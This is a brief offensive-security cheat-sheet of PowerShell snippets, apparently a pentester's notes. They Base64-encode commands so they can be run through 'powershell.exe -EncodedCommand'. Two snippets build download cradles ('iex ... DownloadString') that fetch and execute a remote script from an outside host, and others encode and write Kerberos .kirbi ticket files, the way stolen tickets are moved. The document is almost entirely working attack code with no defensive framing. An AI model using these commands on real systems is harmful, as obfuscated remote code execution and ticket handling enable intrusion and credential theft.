
### PS Base64 Encode

```

  $command = "MeMe"
  $bytes = [Text.Encoding]::Unicode.GetBytes($command)
  $encodedCommand = [Convert]::ToBase64String($bytes)
  echo $encodedCommand
  #Execute command
  powershell.exe -EncodedCommand $encodedcommand
  ```
  ```
  
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
$OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://10.8.0.166:80/download/file.ps1')"
[System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
 ```
  
  ```
  
$command = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.166:80/download/file.ps1'))"
$bytes = [Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
  ```
  ```
   [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\x64\MeMe.kirbi"))
   ```
```
 [System.IO.File]::WriteAllBytes("C:\Users\MeMe\Desktop\MeMe.kirbi", [System.Convert]::FromBase64String("doIF[...snip...]Lmlv"))
 ```
